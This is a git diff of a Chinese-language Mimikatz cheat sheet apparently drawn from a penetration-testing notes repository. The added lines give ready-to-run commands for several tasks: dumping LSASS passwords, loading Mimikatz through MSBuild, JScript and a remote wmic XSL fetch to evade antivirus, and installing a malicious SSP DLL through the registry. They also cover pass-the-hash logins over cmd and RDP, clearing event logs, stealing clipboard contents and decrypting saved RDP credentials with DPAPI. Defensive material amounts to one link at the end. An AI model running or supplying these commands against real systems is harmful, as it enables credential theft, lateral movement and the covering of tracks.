@@ -19,6 +19,33 @@
 - [九种姿势运行 Mimikatz](https://www.freebuf.com/articles/web/176796.html)
 - [Mimikatz 使用小技巧](https://www.webshell.cc/5343.html)
 - [域渗透——Dump Clear-Text Password after KB2871997 installed](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dump%20Clear-Text%20Password%20after%20KB2871997%20installed.html)
+- [【红蓝对抗】内网渗透-免杀抓取windows hash](https://mp.weixin.qq.com/s/WLP1soWz-_BEouMxTHLbzg)
+- [Mimikatz的18种免杀姿势及防御策略(上)](https://mp.weixin.qq.com/s/CiOaMnJBcEQfZXV_hopzLw)
+- [Mimikatz的18种免杀姿势及防御策略(下)](https://mp.weixin.qq.com/s/0p88rj-tWClLa_geKMkPgw)
+- [防御Mimikatz攻击的方法介绍](https://www.freebuf.com/articles/network/180869.html)
+- [获取Windows高版本明文密码](https://mp.weixin.qq.com/s/Q-JBDdt6jPi9fawlGAiHzg)
+- [红队技巧：绕过ESET_NOD32抓取密码](https://mp.weixin.qq.com/s/FaiNEUX2wcscotkyAqUO2Q)
+
+**辅助项目**
+- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 纯 Python 的 Mimikatz 实现,Runs on all OS's which support python>=3.6
+- [3gstudent/msbuild-inline-task](https://github.com/3gstudent/msbuild-inline-task) - 利用 MSBuild 执行 Mimikatz
+    ```
+    cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319
+    .\MSBuild.exe 1.xml
+    ```
+- [Stealthbits/poshkatz](https://github.com/Stealthbits/poshkatz) - PowerShell module for Mimikatz
+- [vyrus001/go-mimikatz](https://github.com/vyrus001/go-mimikatz)
+- JScript
+    - [Instructions-to-mimikatz-js.txt](https://gist.github.com/pljoel/42dae5e56a86a43612bea6961cb59d1a) - JS 加载 Mimikatz
+        ```
+        cscript mimikatz.js
+        ```
+    - [xsl版](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/mimikatz.xsl)
+        ```
+        wmic os get /format:"mimikatz.xsl"
+        wmic os get /FORMAT:"https://example.com/mimikatz.xsl"
+        ```
+    - [sct版](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/mimikatz.sct)
 
 ---
 
@@ -26,12 +53,17 @@
 
 提权
 ```bash
-privilege::debug
+privilege::debug    # 获取调试权限
 ```
 
 抓取密码
 ```bash
 sekurlsa::logonpasswords
+```
+
+如果你没有访问 lsass 进程的权限，那你就抓不到密码, 报错如下
+```
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 ```
 
 输出
@@ -62,16 +94,11 @@ nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
 # 192.168.1.2 为 Victim IP
 ```
 
-若管理员有每过几天就改密码的习惯,但是 mimikatz 抓取到的密码都是老密码,用 QuarksPwDump 等抓的 hash 也是老 hash,新密码却抓不到的情况下
-```bash
-privilege::debug
-misc::memssp
-```
-记录的结果在 `c:/windows/system32/mimilsa.log`
-
 ---
 
 # 无法抓取 windows 明文密码的解决方法
+
+## 改注册表
 
 在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。
 
@@ -150,6 +177,25 @@ misc::memssp
 
     重新读取，可读到明文密码。
 
+## ssp
+
+```bash
+privilege::debug
+misc::memssp
+```
+记录的结果在 `c:/windows/system32/mimilsa.log`
+
+## dll
+
+在 mimikatz 中有 32 和 64 两个版本，安装包里分别都带有不同位数的 mimilib.dll, 将对应版本的 dll 文件复制到 c:\windows\system32 下
+
+将注册表中 Security Packages 的值设置为 mimilib.dll
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d mimilib.dll /f
+```
+
+等待系统重启后，在 c:\windows\system32 生成文件 kiwissp.log，记录当前用户的明文口令
+
 ---
 
 # 离线抓取
@@ -186,6 +232,13 @@ mimikatz 加载 dump 文件
 sekurlsa::minidump debug480
 sekurlsa::logonPasswords full
 ```
+
+还有一些工具
+- SqlDumper
+    ```bash
+    tasklist /svc | findstr lsass.exe  # 查看lsass.exe 的PID号
+    Sqldumper.exe ProcessID 0 0x01100  # 导出mdmp文件
+    ```
 
 **sam + mimikatz**
 
@@ -271,6 +324,41 @@ lsadump::lsa /inject
 
 在对 Windows 系统进行渗透测试过程中，如果获取目标机器的系统权限，则可以通过 hashdump 的方式获取目标机器历史登录信息，包括用户名和用户明文密码或者用户 hash，如果无法直接获取目标用户明文密码，则可以通过 pth 的方式远程登录目标机器
 
+**相关文章**
+- [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
+- https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
+- [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
+- [攻击3389之PTH](https://mp.weixin.qq.com/s/mVSc5geSYwncpOda1OT-0g)
+
+**mimikatz 进行 PtH**
+
+1. (工作组)通过 pth 进行远程登录(cmd)
+    ```bash
+    mimikatz.exe privilege::debug
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:192.168.1.1 /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    ```
+
+2. (域)通过 pth 进行远程登录(cmd)
+    ```bash
+    mimikatz.exe privilege::debug
+    mimikatz.exe sekurlsa::logonpasswords
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash"
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:test.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    ```
+
+3. 通过 pth 进行远程登录(mstsc)
+    ```bash
+    # 管理员权限下执行以下命令:
+    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
+    ```
+
+    RDP 限制管理模式是建立在 Kerberos 基础上的。看一下网络流量，可以看到 RDP 客户端代表模拟的用户请求 ticket，这没有问题，因为我们只需要通过哈希来验证 Kerberos。
+
 **受限管理模式**
 
 通过 pth 的方式远程登录有一个限制：受限管理模式(Restricted Admin mode)
@@ -313,40 +401,6 @@ lsadump::lsa /inject
     ```bash
     REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
     ```
-
-**mimikatz 进行 PtH**
-
-1. (工作组)通过 pth 进行远程登录(cmd)
-    ```bash
-    mimikatz.exe privilege::debug
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:192.168.1.1 /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-    ```
-
-2. (域)通过 pth 进行远程登录(cmd)
-    ```bash
-    mimikatz.exe privilege::debug
-    mimikatz.exe sekurlsa::logonpasswords
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash"
-
-    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:test.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-    ```
-
-3. 通过 pth 进行远程登录(mstsc)
-    ```bash
-    # 管理员权限下执行以下命令:
-    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
-    ```
-
-    RDP 限制管理模式是建立在 Kerberos 基础上的。看一下网络流量，可以看到 RDP 客户端代表模拟的用户请求 ticket，这没有问题，因为我们只需要通过哈希来验证 Kerberos。
-
-**相关文章**
-- [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
-- https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
-- [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
 
 ---
 
@@ -483,3 +537,71 @@ lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:
 # 恢复密码
 lsadump::postzerologon /target:192.168.141.154 /account:WIN-A5GPDCPJ7OT$
 ```
+
+---
+
+# 后渗透
+
+多用户登录 3389
+```
+ts::multirdp
+```
+
+清除日志
+```
+event::drop
+```
+
+粘贴板信息
+```
+misc::clip
+```
+
+---
+
+# DPAPI
+
+通过读取 Lsass 进程信息，获取当前系统中的 MasterKey，能获得多个 Master Key file 对应的 MasterKey
+```
+privilege::debug
+sekurlsa::dpapi
+```
+
+**RDP**
+
+Windows 保存 RDP 凭据的目录是 `C:\Users\用户名\AppData\Local\Microsoft\Credentials`
+
+![](../../../assets/img/Security/安全工具/mimikatz/12.png)
+
+可通过命令行获取，执行: `cmdkey /list` 或 `powerpick Get-ChildItem C:\Users\用户名\AppData\Local\Microsoft\Credentials\ -Force`
+
+注意: `cmdkey /list` 命令务必在 Session 会话下执行，system 下执行无结果。
+
+mimikatz 获取 guidMasterKey,再通过 guid 来找到其所对应的 Masterkey
+```
+privilege::debug
+dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID
+```
+
+![](../../../assets/img/Security/安全工具/mimikatz/13.png)
+
+pbData 是我们要解密的数据，guidMasterKey 是解密所需要的密钥,找到对应的 Masterkey 才能解密
+
+根据上面的 guidMasterKey 来确定其对应的 MasterKey, 如下所示
+```
+sekurlsa::dpapi
+```
+
+![](../../../assets/img/Security/安全工具/mimikatz/14.png)
+
+```
+dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSIONID /masterkey:对应GUID的masterkey"
+```
+
+![](../../../assets/img/Security/安全工具/mimikatz/15.png)
+
+---
+
+# 防御手段
+
+- [Secure-Win](../../Integrated/Windows/Secure-Win.md#防御密码抓取)
